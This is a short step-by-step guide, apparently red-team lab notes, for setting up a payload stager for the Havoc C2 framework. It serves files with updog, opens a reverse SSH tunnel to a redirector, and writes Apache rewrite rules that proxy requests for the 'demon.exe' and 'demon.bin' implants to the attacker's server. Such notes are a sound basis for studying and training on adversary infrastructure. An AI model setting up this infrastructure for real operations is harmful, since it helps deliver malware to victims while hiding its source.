# Stager

1. Setup file hosting service on Attacker Linux.
```
┌──(havoc@havoc):~/Desktop
└─$ updog --ssl
[+] Serving /home/kali/Desktop...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on https://192.168.231.128:9090/ (Press CTRL+C to quit)
```

2. On Attacker Linux VM, setup a SSH tunnel for Payload Stager.
```
┌──(havoc@havoc):~/Desktop
└─$ ssh -N -R 9090:localhost:9090 -i redirector redirector@192.168.231.129
```

3. Add the following lines under `RewriteEngine on` in `.htacccess` file.
```
RewriteCond %{REQUEST_URI} "demon.exe" [NC,OR]
RewriteCond %{REQUEST_URI} "demon.bin" [NC]
RewriteRule ^.*$ "https://localhost:9090%{REQUEST_URI}" [P]
```

4. Restart Apache service.
```
redirector@redirector:~$ sudo systemctl restart apache2
```
